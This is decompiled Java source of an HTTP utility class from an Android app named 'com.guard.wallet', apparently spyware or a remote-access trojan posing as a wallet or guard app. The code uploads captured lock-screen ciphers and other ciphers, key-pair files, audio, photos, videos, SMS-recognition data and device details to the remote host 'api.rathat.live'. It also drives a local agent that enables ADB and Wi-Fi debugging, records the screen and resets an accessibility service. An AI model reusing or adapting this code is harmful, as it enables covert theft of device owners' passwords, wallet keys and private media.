package com.guard.wallet.http;

import android.util.Log;
import com.google.json.JsonObject;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.DeviceUpdateVO;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.QueryAgentFileVO;
import com.guard.wallet.req.ReqAppLocateValueVO;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqListenWindowVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.req.ReqNoticeAliveVO;
import com.guard.wallet.req.ReqResetAccessibilityService;
import com.guard.wallet.req.ReqSmsRecognizePlugVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.CacheTaskResponseVO;
import com.guard.wallet.resp.PushResponseVO;
import com.guard.wallet.resp.RespCipherStateVO;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.FutureTask;
import p0.f0;

public abstract class l {
   public static final String a = "api.rathat.live";
   public static final ConcurrentLinkedQueue b;
   public static final LinkedHashMap c = new LinkedHashMap();

   static {
      ConcurrentLinkedQueue var1 = new ConcurrentLinkedQueue();
      b = var1;
      String var0 = "https://".concat(com.guard.wallet.utils.d.h());
      a = var0;
      StringBuilder var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/message/post.json");
      var1.offer(var2.toString());
      var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/cipher/postLockCipher.json");
      var1.offer(var2.toString());
      var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/cipher/postOtherCipher.json");
      var1.offer(var2.toString());
      var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/pairKeyFile/batch.json");
      var1.offer(var2.toString());
      var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/audioFile/batch.json");
      var1.offer(var2.toString());
      var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/photoFile/batch.json");
      var1.offer(var2.toString());
      var2 = new StringBuilder();
      var2.append(var0);
      var2.append("/api/videoFile/batch.json");
      var1.offer(var2.toString());
   }

   public static void A(LinkedList var0) {
      String var2 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var2) && var0 != null && !var0.isEmpty()) {
         e0 var1 = new e0();
         UploadFileVO var3 = new UploadFileVO(var2, "100013");
         new i().j(var3, "/api/audioFile/batch.json", var0, var1);
      }
   }

   public static void B(ReqUnlockDeviceVO var0) {
      String var1 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var1)) {
         var0.setDeviceId(var1);
         c0 var2 = new c0();
         new i(a).h(var0, "/api/cipher/postLockCipher.json", var2);
      }
   }

   public static void C(RespCipherStateVO var0) {
      String var1 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var1)) {
         var0.setDeviceId(var1);
         c0 var2 = new c0();
         new i(a).h(var0, "/api/cipher/postOtherCipher.json", var2);
      }
   }

   public static void D(LinkedList var0) {
      String var2 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var2) && !var0.isEmpty()) {
         e0 var1 = new e0();
         UploadFileVO var3 = new UploadFileVO(var2, "100014");
         new i().j(var3, "/api/photoFile/batch.json", var0, var1);
      }
   }

   public static void E(LinkedList var0) {
      String var2 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var2) && !var0.isEmpty()) {
         e0 var1 = new e0();
         UploadFileVO var3 = new UploadFileVO(var2, "100015");
         new i().j(var3, "/api/videoFile/batch.json", var0, var1);
      }
   }

   public static void a() {
      String var0 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var0)) {
         ReqAppLocateValueVO var1 = new ReqAppLocateValueVO(var0, com.guard.wallet.utils.h.m());
         a var2 = new a();
         new i().d(var1, "/api/locateValue/entryAppMap.json", var2);
      }
   }

   public static JsonObject b(ReqDefaultBodyVO var0, String var1, String var2) {
      if (!com.guard.wallet.utils.g.l0()) {
         return i.g(null);
      } else {
         try {
            k var3 = new k(var0, var1, var2, 0);
            FutureTask var5 = new FutureTask(var3);
            Thread var6 = new Thread(var5);
            var6.start();
            return (JsonObject)var5.get();
         } catch (Exception var4) {
            a1.q.s("HttpUtils", var4);
            return i.g(null);
         }
      }
   }

   public static void c() {
      String var0 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var0)) {
         ReqDefaultBodyVO var1 = new ReqDefaultBodyVO(var0);
         j.e var2 = new j.e(2);
         new i().d(var1, "/api/cipher/lockCiphers", var2);
      }
   }

   public static boolean d() {
      String var0 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var0) && !a1.q.B("ACCESSIBILITY_CONTAINER")) {
         ReqListenWindowVO var1 = new ReqListenWindowVO(var0, com.guard.wallet.utils.h.m(), "ACCESSIBILITY_CONTAINER");
         m var2 = new m();
         new i().d(var1, "/api/listen/windows.json", var2);
         return true;
      } else {
         return false;
      }
   }

   public static void e() {
      if (!a1.q.B("http://127.0.0.1:7912")) {
         b var0 = new b();
         new i("http://127.0.0.1:7912").d(null, "/closeDevelopment", var0);
      }
   }

   public static void f(String var0) {
      if (!a1.q.B(var0)) {
         c var1 = new c();
         new i(var0).d(null, "/closeWifiDebug", var1);
      }
   }

   public static void g(String var0) {
      String var2 = com.guard.wallet.utils.h.l("deviceId");
      String var1 = var0;
      if (a1.q.B(var0)) {
         var1 = "http://127.0.0.1:7911";
      }

      if (a1.q.B(var2)) {
         e var3 = new e();
         new i(var1).d(null, "/deviceId", var3);
      } else {
         c();
      }
   }

   public static void h(ReqListenHelper var0) {
      if (!a1.q.E(7912)) {
         j.e var1 = new j.e(1);
         new i("http://127.0.0.1:7912").h(var0, "/finishListenHelper", var1);
         Log.d("HttpUtils", "已发送 localFinishListenHelper");
      }
   }

   public static boolean i(ReqListenHelper var0) {
      if (!a1.q.E(7912)) {
         j.e var1 = new j.e(1);
         new i("http://127.0.0.1:7912").h(var0, "/listenHelper", var1);
         Log.d("HttpUtils", "已发送 localListenHelper");
         return true;
      } else {
         return false;
      }
   }

   public static void j() {
      if (com.guard.wallet.utils.g.Z() != null) {
         j.e var1 = new j.e(1);
         ReqNoticeAliveVO var0 = new ReqNoticeAliveVO(com.guard.wallet.utils.g.Z().getPackageName());
         new i("http://127.0.0.1:7912").d(var0, "/noticeAlive", var1);
      }
   }

   public static void k(String var0) {
      if (!a1.q.B(var0)) {
         p var1 = new p();
         new i(var0).d(null, "/openADBDebug", var1);
      }
   }

   public static void l(String var0) {
      if (!a1.q.B(var0)) {
         q var1 = new q();
         new i(var0).d(null, "/openDevelopment", var1);
      }
   }

   public static void m(String var0) {
      if (!a1.q.B(var0)) {
         r var1 = new r();
         new i(var0).d(null, "/openWifiDebug", var1);
      }
   }

   public static boolean n() {
      if (!a1.q.E(7912)) {
         i var1 = new i("http://127.0.0.1:7912");
         String var3 = var1.e(null, "/screenrecord/start");
         l0.m var2 = new l0.m();
         var2.d(var3);
         var2.b("GET", null);
         JsonObject var6 = var1.b(var2.a());
         if (var6 != null) {
            HttpUtils$1 var4 = new HttpUtils$1();
            ApiResult var5 = (ApiResult)com.guard.wallet.utils.h.c(var6.getAsString(), var4);
            if (var5 != null && var5.getSuccess() && (Boolean)var5.getData()) {
               return true;
            }
         }
      }

      return false;
   }

   public static boolean o() {
      if (!a1.q.E(7912)) {
         i var1 = new i("http://127.0.0.1:7912");
         String var3 = var1.e(null, "/screenrecord/stop");
         l0.m var2 = new l0.m();
         var2.d(var3);
         var2.b("GET", null);
         JsonObject var6 = var1.b(var2.a());
         if (var6 != null) {
            HttpUtils$2 var4 = new HttpUtils$2();
            ApiResult var5 = (ApiResult)com.guard.wallet.utils.h.c(var6.getAsString(), var4);
            if (var5 != null && var5.getSuccess() && (Boolean)var5.getData()) {
               return true;
            }
         }
      }

      return false;
   }

   public static void p(ADBConfig var0) {
      j.e var1 = new j.e(1);
      new i("http://127.0.0.1:7911").h(var0, "/syncADBConfig", var1);
   }

   public static JsonObject q(ApiRequest var0, String var1) {
      if (!com.guard.wallet.utils.g.l0()) {
         return i.g(null);
      } else {
         try {
            k var2 = new k(var0, var1, "/api/message/post.json", 1);
            FutureTask var4 = new FutureTask(var2);
            Thread var5 = new Thread(var4);
            var5.start();
            return (JsonObject)var4.get();
         } catch (Exception var3) {
            a1.q.s("HttpUtils", var3);
            return i.g(null);
         }
      }
   }

   public static void r(CacheTaskResponseVO var0) {
      String var1 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var1)) {
         var0.setDeviceId(var1);
         var0.setContainerCode("ACCESSIBILITY_CONTAINER");
         j.e var2 = new j.e(1);
         new i().h(var0, "/api/containerApi/postCacheTaskResponse.json", var2);
      }
   }

   public static void s(PushResponseVO var0) {
      String var1 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var1)) {
         var0.setDeviceId(var1);
         j.e var2 = new j.e(1);
         new i().h(var0, "/api/deviceInstallLog/post.json", var2);
      }
   }

   public static void t(String var0) {
      String var2 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var0) && !a1.q.B(var2)) {
         MessageRecordVO var1 = new MessageRecordVO();
         var1.setDeviceId(var2);
         var1.setIntentCode(var0);
         var1.setExtraBody(new MessageBodyVO());
         ReqMessageVO var6 = new ReqMessageVO();
         var6.setDeviceId(var1.getDeviceId());
         var6.setIntentCode(var1.getIntentCode());
         if (var1.getExtraBody() != null) {
            var6.setExtraBody(com.guard.wallet.utils.h.N(var1.getExtraBody()));
         }

         LinkedList var3 = new LinkedList();
         var3.add(var6);
         ApiRequest var5 = new ApiRequest();
         var5.setData(var3);
         j.e var4 = new j.e(1);
         new i().h(var5, "/api/message/post.json", var4);
      }
   }

   public static boolean u() {
      String var1 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var1)) {
         QueryAgentFileVO var0 = new QueryAgentFileVO();
         var0.setDeviceId(var1);
         u var2 = new u();
         new i().d(var0, "/api/agent/query.json", var2);
         return true;
      } else {
         return false;
      }
   }

   public static void v() {
      String var0 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var0)) {
         ReqDefaultBodyVO var1 = new ReqDefaultBodyVO(var0);
         o var2 = new o();
         new i().d(var1, "/api/walletAuth/strategy/noCompletes", var2);
      }
   }

   public static void w() {
      j.e var0 = new j.e(1);
      ReqResetAccessibilityService var1 = new ReqResetAccessibilityService("com.guard.wallet/.service.MyAccessibilityService");
      new i("http://127.0.0.1:7912").d(var1, "/resetAccessibilityService", var0);
      Log.d("HttpUtils", "已发送 resetAccessibilityService");
   }

   public static void x(p0.e0 var0, p0.e var1) {
      if (var0 != null) {
         f0 var4 = var0.c;
         if (!a1.q.B(var4.a.h)) {
            p0.u var5 = var4.a;
            if (var5.h.contains(a) && !a1.q.E(7912)) {
               i var3 = new i("http://127.0.0.1:7912");
               boolean var2 = a1.q.B(var5.n().getPath());
               String var6 = "/router";
               if (!var2) {
                  var6 = "/router".concat(var5.n().getPath());
               }

               Log.d("FetchClient", "路由转发URI");
               String var10 = var3.f(var6);
               Object var7 = var1;
               if (var1 == null) {
                  var7 = new j.e(1);
               }

               l0.m var8 = new l0.m(var4);
               var8.d(var10);
               f0 var9 = var8.a();
               p0.e0.d(var3.a(), var9, false).a((p0.e)var7);
            }
         }
      }
   }

   public static boolean y() {
      String var0 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var0)) {
         ReqSmsRecognizePlugVO var1 = new ReqSmsRecognizePlugVO(var0);
         z var2 = new z();
         new i().d(var1, "/api/smsRecognize/plug.json", var2);
         return true;
      } else {
         return false;
      }
   }

   public static void z() {
      String var1 = com.guard.wallet.utils.h.l("deviceId");
      if (!a1.q.B(var1)) {
         DeviceUpdateVO var0 = DeviceUpdateVO.of();
         var0.setDeviceId(var1);
         g var2 = new g();
         new i().h(var0, "/api/device/updateDeviceInfo.json", var2);
      }
   }
}
